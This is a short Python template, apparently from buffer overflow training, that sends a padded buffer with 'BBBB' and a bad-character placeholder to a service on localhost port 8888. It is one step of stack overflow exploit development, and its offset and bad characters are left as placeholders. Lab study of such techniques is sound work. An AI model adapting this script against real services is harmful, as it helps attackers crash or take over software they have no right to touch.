import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888

EXACT_OFFSET = YOUR_OFFSET_HERE

BAD_CHARS = ("BADCHARS HERE")

fuzz = "A" * EXACT_OFFSET
fuzz += "BBBB"
fuzz += BAD_CHARS

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((TARGET_IP, TARGET_PORT))
client.send(fuzz)
client.close()

print("-> Checking bad characters")
